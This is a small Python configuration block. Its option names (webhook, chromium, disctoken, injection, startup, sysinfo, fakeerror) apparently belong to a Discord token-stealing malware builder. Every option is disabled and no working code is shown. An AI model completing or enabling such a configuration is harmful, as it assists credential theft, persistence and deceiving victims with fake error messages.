__CONFIG__ = {
    'webhook' : None,
    'chromium' : False,
    'debug' : False,
    'disctoken' : False,
    'injection' : False,
    'startup' : False,
    'sysinfo' : False,
    'fakeerror' : {
        'use' : False,
        'message' : None
    }
}